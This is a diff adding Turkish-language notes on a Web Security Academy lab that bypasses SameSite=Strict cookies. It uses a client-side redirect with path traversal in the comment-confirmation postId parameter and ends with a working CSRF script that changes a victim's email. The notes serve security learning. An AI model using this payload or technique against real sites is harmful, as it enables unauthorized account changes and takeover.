@@ -88,6 +88,23 @@ _method=POST ile bu isteği geçiriyoruz.
 GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1 => isteğin geçtiğini görürüz.
 </script>
 
+8
+Lab: SameSite Strict'i istemci taraflı yönlendirmesi yoluyla atlama
+
+POST /my-account/change-email bu istekte öngörülebilen herhangi bir token yok
+POST /login bu istekte ise SameSite=Strict aktif.
+Set-Cookie: session=fZWYiFuSQu5blhaZ4QSy7m2lYJBy8s6l; Secure; HttpOnly; SameSite=Strict görünen response değerleri.
+blog yorum atıp /post/comment/confirmation?postId=x uc noktasında gelen isteği gördük.
+/resources/js/commentConfirmationRedirect.js bu dosyadan id parametresini eklediğini gördük.
+GET /post/comment/confirmation?postId=x bu istekteki urlyi kopyaladık ve x değerini foo olarak değiştirdik ve yönlendirildiğini gördük. /post/foo olarak döndü.
+/post/comment/confirmation?postId=1/../../my-account dizin geçişi yönlendirmesi başarılı oldu.
+Son olarak exploit serverden aşagıdaki satırları body olarak gönderip emaili güncellemeyi başardık.
+
+
+<script>
+    document.location = "https://$yourlabid.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
+</script>
+
 
 
 
